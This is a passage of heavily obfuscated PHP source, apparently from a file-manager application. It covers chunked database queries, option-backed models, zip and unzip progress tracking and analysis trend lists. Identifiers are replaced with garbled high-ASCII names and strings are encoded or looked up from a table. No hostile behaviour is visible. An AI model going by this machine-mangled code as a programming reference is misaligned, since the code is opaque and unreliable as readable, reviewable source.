"\40\127\x48\x45\116\40\47{$°¯Œ†±ô[1]}\x27\x20\124\110\105\x4e\x20\47{$°¯Œ†±ô[3]}\x27\40\xa"; if ($é¯…®Å == $ÆĞÎÊ™Ç || $ÀºˆŒÉÄ == $¶Ê«§›€ - 1) { $¶øƒÉÎú = implode($”çè‹›[50], $ì°ïî²”); $Í¨Íƒï… .= "\40\x45\x4e\104\x20\40\127\x48\105\122\x45\40{$°¯Œ†±ô[0]}\x20\x49\116\40\x28{$¶øƒÉÎú}\x29\40"; $this->execute($Í¨Íƒï…); $é¯…®Å = 0; $Í¨Íƒï… = $ßÒ¤¶Š; $this->chunkEventCheck(count($ì°ïî²”)); $ì°ïî²” = array(); } } $this->chunkEventSet(); } public function saveAllEach($´×ß «û) { $ØØ¢èğ‰ =& $_SERVER[ï»»·÷á]; $•Ş´Á = $this->tablePrefix . $this->tableName; foreach ($´×ß «û as $¥œ„Ü) { if (!is_array($¥œ„Ü) || count($¥œ„Ü) != 4) { continue; } $Ç¶…ÚÄ¿ = $¥œ„Ü[0] . $ØØ¢èğ‰[379] . $¥œ„Ü[1] . $ØØ¢èğ‰[118]; $©ÙÔß¤Ş = $¥œ„Ü[2] . $ØØ¢èğ‰[379] . $¥œ„Ü[3] . $ØØ¢èğ‰[118]; $ğùˆ­Ô² = "\165\x70\144\x61\x74\145\40{$•Ş´Á}\x20\x73\145\164\x20{$©ÙÔß¤Ş}\x20\167\x68\x65\162\145\40{$Ç¶…ÚÄ¿}\x3b"; $this->execute($ğùˆ­Ô²); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Ä„ñ¸¢å = false, $Š¡œÃëš = false) { $this->_chunkEvent = $Ä„ñ¸¢å; $this->_chunkEventParam = $Š¡œÃëš; } private function chunkEventCheck($”±î¶ê†) { if (!$this->_chunkEvent) { return; } $ÛçÌ¨ú¯ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ÛçÌ¨ú¯[$_SERVER[ï»»·÷á][380]] = $”±î¶ê†; Hook::trigger($this->_chunkEvent, $ÛçÌ¨ú¯); } public function addAll($Ç¥Ş¶¬Î, $¦Ğêóş = array(), $ÇŒ€§«æ = false) { $Ê¦Ø“Âß =& $_SERVER[ï»»·÷á]; ignore_timeout(); $’·æ¦¤ü = self::SQL_WHERE_IN_CHUNK; if (empty($Ç¥Ş¶¬Î)) { $this->error = think_lang($Ê¦Ø“Âß[271]); return !1; } $¦Ğêóş = $this->_parseOptions($¦Ğêóş); foreach ($Ç¥Ş¶¬Î as $Ú……ò¤‡ => $à¯§›¤ë) { $Ç¥Ş¶¬Î[$Ú……ò¤‡] = $this->_facade($à¯§›¤ë); $this->_beforeInsert($Ç¥Ş¶¬Î[$Ú……ò¤‡], $¦Ğêóş); } if (method_exists($this->db, $Ê¦Ø“Âß[272])) { for ($¦öÌÕÃ = 0; $¦öÌÕÃ < count($Ç¥Ş¶¬Î); $¦öÌÕÃ += $’·æ¦¤ü) { $ÎÇ­ºÇã = array_slice($Ç¥Ş¶¬Î, $¦öÌÕÃ, $’·æ¦¤ü); if (!is_array($ÎÇ­ºÇã) || count($ÎÇ­ºÇã) == 0) { break; } $ö¥Ê¼£Ú = $this->db->insertAll($ÎÇ­ºÇã, $¦Ğêóş, $ÇŒ€§«æ); $this->chunkEventCheck(count($ÎÇ­ºÇã)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Ç¥Ş¶¬Î as $Ú……ò¤‡ => $à¯§›¤ë) { $ö¥Ê¼£Ú = $this->db->insert($à¯§›¤ë, $¦Ğêóş, $ÇŒ€§«æ); } $this->commit(); } if (!1 !== $ö¥Ê¼£Ú) { $ÂÈ¼¨áë = $this->getLastInsID(); if ($ÂÈ¼¨áë) { return $ÂÈ¼¨áë; } } return $ö¥Ê¼£Ú; } public function save($ˆŠÇñÀà = '', $Ãª—ºşÆ = array()) { $˜ı†«Î™ =& $_SERVER[ï»»·÷á]; $…–ë ç = self::SQL_WHERE_IN_CHUNK; $Úá¦Äµú = $this->optionsValue(); $ÄÎº¨è = $this->findWhereField($Úá¦Äµú); if (!$ÄÎº¨è) { return parent::save($ˆŠÇñÀà, $Ãª—ºşÆ); } $«Ï®íü¦ = 0; $Ğú¡·®Ş = $Úá¦Äµú[$˜ı†«Î™[275]][$ÄÎº¨è][1]; $Ğú¡·®Ş = is_array($Ğú¡·®Ş) ? $Ğú¡·®Ş : array(); $Ì»×ˆòø = count($Ğú¡·®Ş); for ($÷¯·ğş = 0; $÷¯·ğş < $Ì»×ˆòø; $÷¯·ğş += $…–ë ç) { $êòï ¼¸ = array_slice($Ğú¡·®Ş, $÷¯·ğş, $…–ë ç); if (!is_array($êòï ¼¸) || count($êòï ¼¸) == 0) { break; } $Úá¦Äµú[$˜ı†«Î™[275]][$ÄÎº¨è][1] = $êòï ¼¸; $this->optionsValue($Úá¦Äµú); $«Ï®íü¦ += parent::save($ˆŠÇñÀà, $Ãª—ºşÆ); $this->chunkEventCheck(count($êòï ¼¸)); } $this->chunkEventSet(); return $«Ï®íü¦; } public function add($¦¸ö’ã = '', $å™ÑëÎ• = array(), $óß•‘Íã = false) { if ($this->addTaskStatus && is_array($¦¸ö’ã)) { $this->addTaskData[] = $¦¸ö’ã; return; } return parent::add($¦¸ö’ã, $å™ÑëÎ•, $óß•‘Íã); } public function parseWhereLike($íşöÑ¬, $Ïû¼’÷ = '', $…Ø¸÷ä† = false, &$øèè¬öÀ = false) { $ĞÇÄ™ÇÙ =& $_SERVER[ï»»·÷á]; $ÓŒíßÉ = $GLOBALS[$ĞÇÄ™ÇÙ[6]][$ĞÇÄ™ÇÙ[381]]; if (!$ÓŒíßÉ[$ĞÇÄ™ÇÙ[382]]) { return $íşöÑ¬; } if (!is_array($íşöÑ¬)) { return $íşöÑ¬; } $ºÆÆùª = array(); $³É¦œğ« = 0; foreach ($íşöÑ¬ as $ò¾ÌÆô´ => $áşšõ€Å) { if (is_array($áşšõ€Å) && count($áşšõ€Å) == 2 && $áşšõ€Å[0] == $ĞÇÄ™ÇÙ[383] && is_string($áşšõ€Å[1]) && substr($áşšõ€Å[1], 0, 1) == $ĞÇÄ™ÇÙ[384] && substr($áşšõ€Å[1], strlen($áşšõ€Å[1]) - 1, 1) == $ĞÇÄ™ÇÙ[384]) { $øèè¬öÀ = !0; $çßƒ€ã‹ = is_string($ò¾ÌÆô´) ? $ò¾ÌÆô´ : $Ïû¼’÷; $ˆ—÷¸‘Ë = substr($áşšõ€Å[1], 1, strlen($áşšõ€Å[1]) - 2); $ˆ—÷¸‘Ë = $this->db->escapeString($ˆ—÷¸‘Ë); if (!strpos($çßƒ€ã‹, $ĞÇÄ™ÇÙ[10])) { $çßƒ€ã‹ = $ĞÇÄ™ÇÙ[385] . $çßƒ€ã‹ . $ĞÇÄ™ÇÙ[385]; } $¿À¬ıÜµ = $ĞÇÄ™ÇÙ[189] . $ˆ—÷¸‘Ë . $ĞÇÄ™ÇÙ[189]; $ˆ—÷¸‘Ë = str_replace(array($ĞÇÄ™ÇÙ[10], $ĞÇÄ™ÇÙ[386], $ĞÇÄ™ÇÙ[11]), $ĞÇÄ™ÇÙ[387], $ˆ—÷¸‘Ë); if ($ÓŒíßÉ[$ĞÇÄ™ÇÙ[388]]) { $¿À¬ıÜµ = $ĞÇÄ™ÇÙ[389] . $ˆ—÷¸‘Ë . $ĞÇÄ™ÇÙ[390]; if ($ÓŒíßÉ[$ĞÇÄ™ÇÙ[391]]) { $¿À¬ıÜµ = $ĞÇÄ™ÇÙ[390] . $ˆ—÷¸‘Ë . $ĞÇÄ™ÇÙ[389]; } } $ºÆÆùª[$³É¦œğ«] = $ĞÇÄ™ÇÙ[392] . $çßƒ€ã‹ . $ĞÇÄ™ÇÙ[393] . $¿À¬ıÜµ . $ĞÇÄ™ÇÙ[394]; $³É¦œğ«++; continue; } if (is_array($áşšõ€Å)) { $Ïû¼’÷ = is_string($ò¾ÌÆô´) ? $ò¾ÌÆô´ : $Ïû¼’÷; $áşšõ€Å = $this->parseWhereLike($áşšõ€Å, $Ïû¼’÷, !0, $øèè¬öÀ); } if (is_numeric($ò¾ÌÆô´)) { $ºÆÆùª[$³É¦œğ«] = $áşšõ€Å; $³É¦œğ«++; } else { $ºÆÆùª[$ò¾ÌÆô´] = $áşšõ€Å; } } if ($øèè¬öÀ && !$…Ø¸÷ä†) { } return $ºÆÆùª; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($¡£‡á–Ë = array()) { $¡ùù¹Ø• =& $_SERVER[ï»»·÷á]; $¢ƒÔ°ÈÈ = self::SQL_WHERE_IN_CHUNK; $Á¦éÎ”Š = $this->optionsValue(); $–ÃÁÛì„ = $this->findWhereField($Á¦éÎ”Š); if (!$–ÃÁÛì„ || isset($Á¦éÎ”Š[$¡ùù¹Ø•[292]]) || isset($Á¦éÎ”Š[$¡ùù¹Ø•[353]])) { return parent::select($¡£‡á–Ë); } $úúêµ®• = $Á¦éÎ”Š[$¡ùù¹Ø•[275]][$–ÃÁÛì„][1]; $úúêµ®• = is_array($úúêµ®•) ? $úúêµ®• : array(); $Ã…«Ïá = null; for ($¦ç¿ÔŠã = 0; $¦ç¿ÔŠã < count($úúêµ®•); $¦ç¿ÔŠã += $¢ƒÔ°ÈÈ) { $ù¤Â›ÎÇ = array_slice($úúêµ®•, $¦ç¿ÔŠã, $¢ƒÔ°ÈÈ); if (!is_array($ù¤Â›ÎÇ) || count($ù¤Â›ÎÇ) == 0) { break; } $Á¦éÎ”Š[$¡ùù¹Ø•[275]][$–ÃÁÛì„][1] = $ù¤Â›ÎÇ; $this->optionsValue($Á¦éÎ”Š); $”Õ±ë½® = parent::select($¡£‡á–Ë); if (!$”Õ±ë½®) { continue; } $Ã…«Ïá = is_array($Ã…«Ïá) ? $Ã…«Ïá : array(); $Ã…«Ïá = array_merge($Ã…«Ïá, $”Õ±ë½®); } return $Ã…«Ïá; } public function delete($ìíş–Ö¨ = array()) { $µÀáåÃé =& $_SERVER[ï»»·÷á]; $ïÃ½Ø¨è = self::SQL_WHERE_IN_CHUNK; $áÅï‰¹Ê = $this->optionsValue(); $§”€ß = $this->findWhereField($áÅï‰¹Ê); if (!$§”€ß) { return parent::delete($ìíş–Ö¨); } $Ò·”€å = 0; $÷ÊŠå—Ó = $áÅï‰¹Ê[$µÀáåÃé[275]][$§”€ß][1]; $÷ÊŠå—Ó = is_array($÷ÊŠå—Ó) ? $÷ÊŠå—Ó : array(); for ($ôáúîì¾ = 0; $ôáúîì¾ < count($÷ÊŠå—Ó); $ôáúîì¾ += $ïÃ½Ø¨è) { $˜ò—°ùÅ = array_slice($÷ÊŠå—Ó, $ôáúîì¾, $ïÃ½Ø¨è); if (!is_array($˜ò—°ùÅ) || count($˜ò—°ùÅ) == 0) { break; } $áÅï‰¹Ê[$µÀáåÃé[275]][$§”€ß][1] = $˜ò—°ùÅ; $this->optionsValue($áÅï‰¹Ê); $Ò·”€å += parent::delete($ìíş–Ö¨); } return $Ò·”€å; } private function findWhereField($·çÀÈœ™) { $ºĞúÛ™¶ =& $_SERVER[ï»»·÷á]; $Ï´®¨ê® = self::SQL_WHERE_IN_CHUNK; if (!is_array($·çÀÈœ™) || !is_array($·çÀÈœ™[$ºĞúÛ™¶[275]])) { return !1; } foreach ($·çÀÈœ™[$ºĞúÛ™¶[275]] as $†ò×ÛÀ¼ => $Åüø’Ÿı) { if (is_array($Åüø’Ÿı) && isset($Åüø’Ÿı[0]) && is_string($Åüø’Ÿı[0]) && strtolower($Åüø’Ÿı[0]) == $ºĞúÛ™¶[7] && is_array($Åüø’Ÿı[1]) && count($Åüø’Ÿı[1]) > $Ï´®¨ê®) { ignore_timeout(); return $†ò×ÛÀ¼; } } return !1; } public function setMasterDB($Ë¸¹—¸Š = true) { think_config($_SERVER[ï»»·÷á][395], $Ë¸¹—¸Š); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\145\155\117\160\x74\x69\x6f\156"; public $field = array(); public function listData($ˆÔ÷ç³ = false, $Úò‚–Å‡ = "\x6d\157\x64\151\146\171\124\x69\x6d\x65", $Ùô¹œ¨Ş = false) { $¸ğ—³…å = Model($this->modelType)->get(!1, $this->optionType, !0); $úŞû™€¡ = array_values($¸ğ—³…å); if ($úŞû™€¡ && $úŞû™€¡[0] && !is_array($úŞû™€¡[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¸ğ—³…å = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¸ğ—³…å) { return $ˆÔ÷ç³ ? null : array(); } if (!$ˆÔ÷ç³) { $¸ğ—³…å = array_filter(array_values($¸ğ—³…å)); return array_sort_by($¸ğ—³…å, $Úò‚–Å‡, $Ùô¹œ¨Ş); } return $¸ğ—³…å[$_SERVER[ï»»·÷á][396] . $ˆÔ÷ç³]; } public function insert($œ ïïş) { $³´ƒıêÒ =& $_SERVER[ï»»·÷á]; $œ ïïş = array_field_key($œ ïïş, $this->field); $‡™ø·¼ = Model($this->modelType)->get($³´ƒıêÒ[397], $this->optionType . $³´ƒıêÒ[398]); $‡™ø·¼ = $‡™ø·¼ ? $‡™ø·¼ : 0; $œ ïïş[$³´ƒıêÒ[399]] = ++$‡™ø·¼; $œ ïïş[$³´ƒıêÒ[201]] = time(); $œ ïïş[$³´ƒıêÒ[85]] = time(); Model($this->modelType)->set($³´ƒıêÒ[397], $‡™ø·¼, $this->optionType . $³´ƒıêÒ[398]); Model($this->modelType)->set($³´ƒıêÒ[396] . $‡™ø·¼, $œ ïïş, $this->optionType); return $‡™ø·¼; } public function update($¡±¶ÖøÙ, $ØúÛÓé) { $Ò¡—¶–ä =& $_SERVER[ï»»·÷á]; $ØúÛÓé = array_field_key($ØúÛÓé, $this->field); $®’ÓÆ§Ş = $this->listData($¡±¶ÖøÙ); if (!$®’ÓÆ§Ş || !$¡±¶ÖøÙ) { return !1; } $ØúÛÓé = array_merge($®’ÓÆ§Ş, $ØúÛÓé); $ØúÛÓé[$Ò¡—¶–ä[85]] = time(); return Model($this->modelType)->set($Ò¡—¶–ä[396] . $¡±¶ÖøÙ, $ØúÛÓé, $this->optionType); } public function remove($¦¼ä¿ƒØ) { if (!$¦¼ä¿ƒØ) { return !1; } return Model($this->modelType)->remove($_SERVER[ï»»·÷á][396] . $¦¼ä¿ƒØ, $this->optionType); } public function clear() { $¡Üä”Úü =& $_SERVER[ï»»·÷á]; Model($this->modelType)->remove($¡Üä”Úü[397], $this->optionType . $¡Üä”Úü[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($°¡ºÄ”Ù, $·İ ¹¶§) { if (!$·İ ¹¶§) { return !1; } $‰Úøş× = $this->listData(); $‰Úøş× = array_to_keyvalue($‰Úøş×, $°¡ºÄ”Ù); return isset($‰Úøş×[$·İ ¹¶§]) ? $‰Úøş×[$·İ ¹¶§] : !1; } public function findByName($›¨ğïÀä) { return $this->findByKey($_SERVER[ï»»·÷á][32], $›¨ğïÀä); } protected function resetData($ªÜÜÂµ) { $ÒË… ûº =& $_SERVER[ï»»·÷á]; $ªÜÜÂµ = is_array($ªÜÜÂµ) ? $ªÜÜÂµ : array(); $´ú•ıè× = array(); for ($ÉØŞòĞ = 0; $ÉØŞòĞ < count($ªÜÜÂµ); $ÉØŞòĞ++) { $´ú•ıè×[$ÒË… ûº[396] . $ªÜÜÂµ[$ÉØŞòĞ][$ÒË… ûº[399]]] = $ªÜÜÂµ[$ÉØŞòĞ]; } return Model($this->modelType)->set($´ú•ıè×, !1, $this->optionType); } private function getAutoName($¯¥­ó) { $Ÿà±šÔÂ = array_to_keyvalue($this->listData(), $_SERVER[ï»»·÷á][32]); if (!$Ÿà±šÔÂ || !isset($Ÿà±šÔÂ[$¯¥­ó])) { return $¯¥­ó; } for ($äÚ’¦¶ = 1; $äÚ’¦¶ < count($Ÿà±šÔÂ); $äÚ’¦¶++) { $ä”ø¿ââ = $¯¥­ó . "\50{$äÚ’¦¶}\x29"; if (!isset($Ÿà±šÔÂ[$ä”ø¿ââ])) { return $ä”ø¿ââ; } } return $ä”ø¿ââ; } } goto Bßèò÷´£°; bçï¡İóµ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Ëˆ†Ø­¢ =& $_SERVER[ï»»·÷á]; parent::startAfter(); Hook::bind($Ëˆ†Ø­¢[1788], array($this, $Ëˆ†Ø­¢[1789])); Hook::bind($Ëˆ†Ø­¢[1203], array($this, $Ëˆ†Ø­¢[1790])); $Âìæ»ìÆ =& $this->task; $Âìæ»ìÆ[$Ëˆ†Ø­¢[1791]] = $Ëˆ†Ø­¢[1204]; if (!$Âìæ»ìÆ[$Ëˆ†Ø­¢[1576]]) { $Âìæ»ìÆ[$Ëˆ†Ø­¢[1576]] = LNG($Ëˆ†Ø­¢[1792]); } } protected function endAfter() { $‹ˆˆ¼‰¡ =& $_SERVER[ï»»·÷á]; parent::endAfter(); Hook::unbind($‹ˆˆ¼‰¡[1788], array($this, $‹ˆˆ¼‰¡[1789])); Hook::unbind($‹ˆˆ¼‰¡[1203], array($this, $‹ˆˆ¼‰¡[1790])); } public function updateAfter() { $¥°Îªû¶ =& $_SERVER[ï»»·÷á]; $õÂ™ö =& $this->task; if (!$õÂ™ö[$¥°Îªû¶[799]] || !$õÂ™ö[$¥°Îªû¶[776]]) { return; } if ($õÂ™ö[$¥°Îªû¶[1791]] == $¥°Îªû¶[1204]) { $şªïÚ = 0; if ($õÂ™ö[$¥°Îªû¶[1731]]) { $şªïÚ = $õÂ™ö[$¥°Îªû¶[1732]] / $õÂ™ö[$¥°Îªû¶[1731]]; } $õÂ™ö[$¥°Îªû¶[1680]] = $şªïÚ * 0.3; } else { if ($õÂ™ö[$¥°Îªû¶[1791]] == $¥°Îªû¶[313]) { $şªïÚ = $õÂ™ö[$¥°Îªû¶[1679]] / $õÂ™ö[$¥°Îªû¶[799]]; $õÂ™ö[$¥°Îªû¶[1680]] = 0.3 + $şªïÚ * 0.4; } else { if ($õÂ™ö[$¥°Îªû¶[1791]] == $¥°Îªû¶[107]) { $µêÁğÎó = 0; if ($õÂ™ö[$¥°Îªû¶[1733]] == $¥°Îªû¶[107]) { $µêÁğÎó = $õÂ™ö[$¥°Îªû¶[1732]]; } $şªïÚ = ($õÂ™ö[$¥°Îªû¶[1736]] + $µêÁğÎó) / $õÂ™ö[$¥°Îªû¶[776]]; $õÂ™ö[$¥°Îªû¶[1680]] = 0.3 + 0.4 + $şªïÚ * 0.3; } } } if ($õÂ™ö[$¥°Îªû¶[1680]] > 0) { $‰ˆ¯ÎÉ² = timeFloat() - $õÂ™ö[$¥°Îªû¶[1682]] - $õÂ™ö[$¥°Îªû¶[1685]]; $õÂ™ö[$¥°Îªû¶[1686]] = $‰ˆ¯ÎÉ² * (1 - $õÂ™ö[$¥°Îªû¶[1680]]) / $õÂ™ö[$¥°Îªû¶[1680]]; } } public function addFile($÷¯Çâ¿¹) { $ùªÅæÛ´ =& $_SERVER[ï»»·÷á]; $ïÇîñıñ =& $this->task; $ÈË«ı¯Ó = IO::info($÷¯Çâ¿¹); $ïÇîñıñ[$ùªÅæÛ´[1729]] = $ÈË«ı¯Ó[$ùªÅæÛ´[32]]; $ïÇîñıñ[$ùªÅæÛ´[1731]] = $ÈË«ı¯Ó[$ùªÅæÛ´[76]]; $ïÇîñıñ[$ùªÅæÛ´[1732]] = 0; $ïÇîñıñ[$ùªÅæÛ´[1074]] = $ùªÅæÛ´[1752]; $ïÇîñıñ[$ùªÅæÛ´[1733]] = $ùªÅæÛ´[1204]; $ïÇîñıñ[$ùªÅæÛ´[776]] = $ÈË«ı¯Ó[$ùªÅæÛ´[76]]; $ïÇîñıñ[$ùªÅæÛ´[799]] = 1; $Óï¥ûş  = 0; $ïÇîñıñ[$ùªÅæÛ´[1740]] = array($ùªÅæÛ´[1741] => $Óï¥ûş  + 1, $ùªÅæÛ´[429] => $ÈË«ı¯Ó[$ùªÅæÛ´[32]], $ùªÅæÛ´[84] => $ÈË«ı¯Ó[$ùªÅæÛ´[84]], $ùªÅæÛ´[518] => $ÈË«ı¯Ó[$ùªÅæÛ´[518]] ? $ÈË«ı¯Ó[$ùªÅæÛ´[518]] : $ÈË«ı¯Ó[$ùªÅæÛ´[84]]); $this->update(); } public function unzipAfter($öŞĞúˆ«) { $§ÛÛ¿òü =& $_SERVER[ï»»·÷á]; $­á¼ãÔ =& $this->task; $­á¼ãÔ[$§ÛÛ¿òü[1791]] = $§ÛÛ¿òü[107]; $ó ©­ıº = IO::infoWithChildren($öŞĞúˆ«); $ğàÆ”Ò£ = 0; $­á¼ãÔ[$§ÛÛ¿òü[1740]] = array($§ÛÛ¿òü[1741] => $ğàÆ”Ò£ + 1, $§ÛÛ¿òü[429] => $ó ©­ıº[$§ÛÛ¿òü[32]], $§ÛÛ¿òü[84] => $ó ©­ıº[$§ÛÛ¿òü[84]], $§ÛÛ¿òü[518] => $ó ©­ıº[$§ÛÛ¿òü[518]] ? $ó ©­ıº[$§ÛÛ¿òü[518]] : $ó ©­ıº[$§ÛÛ¿òü[84]]); if ($ó ©­ıº[$§ÛÛ¿òü[33]] == $§ÛÛ¿òü[200]) { $­á¼ãÔ[$§ÛÛ¿òü[799]] = 1; } else { $­á¼ãÔ[$§ÛÛ¿òü[799]] = $ó ©­ıº[$§ÛÛ¿òü[79]][$§ÛÛ¿òü[77]]; } $­á¼ãÔ[$§ÛÛ¿òü[1074]] = $§ÛÛ¿òü[12]; $­á¼ãÔ[$§ÛÛ¿òü[1733]] = 0; $­á¼ãÔ[$§ÛÛ¿òü[1679]] = 0; $­á¼ãÔ[$§ÛÛ¿òü[1731]] = 0; $­á¼ãÔ[$§ÛÛ¿òü[1732]] = 0; $­á¼ãÔ[$§ÛÛ¿òü[1729]] = $§ÛÛ¿òü[12]; $­á¼ãÔ[$§ÛÛ¿òü[1736]] = 0; $­á¼ãÔ[$§ÛÛ¿òü[776]] = $ó ©­ıº[$§ÛÛ¿òü[76]]; $this->update(); self::log($§ÛÛ¿òü[1793] . json_encode(array($­á¼ãÔ, $ó ©­ıº))); } public function nameParse($û·ùê›) { $öµÓßÁ =& $_SERVER[ï»»·÷á]; $È±ªìĞï =& $this->task; if ($È±ªìĞï[$öµÓßÁ[1791]] == $öµÓßÁ[1204]) { $È±ªìĞï[$öµÓßÁ[1791]] = $öµÓßÁ[313]; $È±ªìĞï[$öµÓßÁ[1736]] = 0; $È±ªìĞï[$öµÓßÁ[776]] = 0; } $äç¶Á·  = get_path_this($û·ùê›); if (strstr($äç¶Á· , $öµÓßÁ[10])) { $È±ªìĞï[$öµÓßÁ[1679]] += 1; $È±ªìĞï[$öµÓßÁ[799]] += 1; } $È±ªìĞï[$öµÓßÁ[1729]] = $û·ùê›; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÃÌ© êÀ =& $_SERVER[ï»»·÷á]; parent::startAfter(); Hook::bind($ÃÌ© êÀ[1794], array($this, $ÃÌ© êÀ[1789])); $Å¯ßß‰‹ =& $this->task; $Å¯ßß‰‹[$ÃÌ© êÀ[1791]] = $ÃÌ© êÀ[1204]; if (!$Å¯ßß‰‹[$ÃÌ© êÀ[1576]]) { $Å¯ßß‰‹[$ÃÌ© êÀ[1576]] = LNG($ÃÌ© êÀ[1795]); } } protected function endAfter() { $—ºÊœì =& $_SERVER[ï»»·÷á]; parent::endAfter(); Hook::unbind($—ºÊœì[1794], array($this, $—ºÊœì[1789])); } public function updateAfter() { $£Ò‰Ò¿® =& $_SERVER[ï»»·÷á]; $øÛöøº =& $this->task; if (!$øÛöøº[$£Ò‰Ò¿®[799]] || !$øÛöøº[$£Ò‰Ò¿®[776]]) { return; } if ($øÛöøº[$£Ò‰Ò¿®[1791]] == $£Ò‰Ò¿®[1204]) { $ùëñ°ãÇ = $øÛöøº[$£Ò‰Ò¿®[1732]]; if ($øÛöøº[$£Ò‰Ò¿®[1733]] != $£Ò‰Ò¿®[1204]) { $ùëñ°ãÇ = 0; } $…›¥Î¶ù = ($øÛöøº[$£Ò‰Ò¿®[1736]] + $ùëñ°ãÇ) / $øÛöøº[$£Ò‰Ò¿®[776]]; $øÛöøº[$£Ò‰Ò¿®[1680]] = $…›¥Î¶ù * 0.3; } else { if ($øÛöøº[$£Ò‰Ò¿®[1791]] == $£Ò‰Ò¿®[313]) { $…›¥Î¶ù = $øÛöøº[$£Ò‰Ò¿®[1679]] / $øÛöøº[$£Ò‰Ò¿®[799]]; $øÛöøº[$£Ò‰Ò¿®[1680]] = 0.3 + $…›¥Î¶ù * 0.5; } else { if ($øÛöøº[$£Ò‰Ò¿®[1791]] == $£Ò‰Ò¿®[107]) { $…›¥Î¶ù = 0; if ($øÛöøº[$£Ò‰Ò¿®[1731]]) { $…›¥Î¶ù = $øÛöøº[$£Ò‰Ò¿®[1732]] / $øÛöøº[$£Ò‰Ò¿®[1731]]; } $øÛöøº[$£Ò‰Ò¿®[1680]] = 0.3 + 0.5 + $…›¥Î¶ù * 0.2; } } } if ($øÛöøº[$£Ò‰Ò¿®[1680]] > 0) { $Ï™¨³¿ = timeFloat() - $øÛöøº[$£Ò‰Ò¿®[1682]] - $øÛöøº[$£Ò‰Ò¿®[1685]]; $øÛöøº[$£Ò‰Ò¿®[1686]] = $Ï™¨³¿ * (1 - $øÛöøº[$£Ò‰Ò¿®[1680]]) / $øÛöøº[$£Ò‰Ò¿®[1680]]; } } public function copyFileStart($µÈë…«, $£ÏóåÛÔ, $‹·ÀÖÎï, $©À«ÄîŸ, $ğáÁÖ¨, $òÍ‹Ú¶) { $»èû‚Û =& $_SERVER[ï»»·÷á]; parent::copyFileStart($µÈë…«, $£ÏóåÛÔ, $‹·ÀÖÎï, $©À«ÄîŸ, $ğáÁÖ¨, $òÍ‹Ú¶); $€È­™¨î =& $this->task; if ($€È­™¨î[$»èû‚Û[1791]] == $»èû‚Û[313]) { $€È­™¨î[$»èû‚Û[1791]] = $»èû‚Û[107]; } $this->update(); } public function copyFileEnd($–Ç€Á¡ô, $¢”·Üø–, $ˆ®îÉó, $„Œœ¼Úê, $ÏŞóÑ³Ÿ, $¦ø‹æà) { $ ¦­»ô =& $_SERVER[ï»»·÷á]; $Û»•ñ™ú =& $this->task; $Û»•ñ™ú[$ ¦­»ô[1732]] = $Û»•ñ™ú[$ ¦­»ô[1731]]; $Û»•ñ™ú[$ ¦­»ô[1736]] += $Û»•ñ™ú[$ ¦­»ô[1731]]; $Û»•ñ™ú[$ ¦­»ô[1733]] = $ ¦­»ô[12]; $this->update(); } public function nameParse($Ïì—ŞØ£) { $«üášáù =& $_SERVER[ï»»·÷á]; $Œ ¹¾ãÚ =& $this->task; if ($Œ ¹¾ãÚ[$«üášáù[1679]] < $Œ ¹¾ãÚ[$«üášáù[799]]) { $µìòŞ–æ = get_path_this($Ïì—ŞØ£); if (strstr($µìòŞ–æ, $«üášáù[10])) { $Œ ¹¾ãÚ[$«üášáù[1679]] += 1; } } if ($Œ ¹¾ãÚ[$«üášáù[1791]] == $«üášáù[1204]) { $Œ ¹¾ãÚ[$«üášáù[1791]] = $«üášáù[313]; } $Œ ¹¾ãÚ[$«üášáù[1729]] = $Ïì—ŞØ£; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($•È´´Æ) { $³ğ²×ÀŞ =& $_SERVER[ï»»·÷á]; $•ÑŠéŠÃ = array($³ğ²×ÀŞ[599] => array($³ğ²×ÀŞ[33] => $³ğ²×ÀŞ[1796], $³ğ²×ÀŞ[273] => array($³ğ²×ÀŞ[224], $³ğ²×ÀŞ[778], $³ğ²×ÀŞ[1797], $³ğ²×ÀŞ[1798])), $³ğ²×ÀŞ[1799] => array($³ğ²×ÀŞ[33] => $³ğ²×ÀŞ[1800], $³ğ²×ÀŞ[273] => array($³ğ²×ÀŞ[224], $³ğ²×ÀŞ[776], $³ğ²×ÀŞ[1801], $³ğ²×ÀŞ[1802], $³ğ²×ÀŞ[1803]))); if (!isset($•ÑŠéŠÃ[$•È´´Æ])) { return !1; } $this->optionType = $•ÑŠéŠÃ[$•È´´Æ][$³ğ²×ÀŞ[33]]; $this->field = $•ÑŠéŠÃ[$•È´´Æ][$³ğ²×ÀŞ[273]]; return !0; } public function listData($ÌšÄŒĞ‡ = false, $¿˜ÒŠÆ¿ = "\155\x6f\144\151\146\171\124\151\155\145", $…©õÍ—¨ = false) { return parent::listData($ÌšÄŒĞ‡, $¿˜ÒŠÆ¿, $…©õÍ—¨); } public function trendList($¯»êĞÛÅ) { $†ëèĞ› =& $_SERVER[ï»»·÷á]; $‰«¹ÄÉÊ = $this->listData(); if ($‰«¹ÄÉÊ) { $×ß‡óıû = end($‰«¹ÄÉÊ); $œ‡šéı² = date($†ëèĞ›[1804], strtotime($†ëèĞ›[1805])); if ($×ß‡óıû[$†ëèĞ›[224]] == $œ‡šéı²) { return $‰«¹ÄÉÊ; } $…½×¬˜³ = strtotime($×ß‡óıû[$†ëèĞ›[224]]); } if (!isset($…½×¬˜³)) { $³€Ñêíô = $¯»êĞÛÅ == $†ëèĞ›[599] ? $†ëèĞ›[534] : $†ëèĞ›[838]; $…½×¬˜³ = Model($³€Ñêíô)->min($†ëèĞ›[201]); } $‰ûØ­ = $†ëèĞ›[1806] . ucfirst($¯»êĞÛÅ); $¢ĞØ´Ş = $this->dateList($…½×¬˜³); foreach ($¢ĞØ´Ş as $œ‡šéı²) { $this->{$‰ûØ­}($œ‡šéı²); } return $this->listData(); 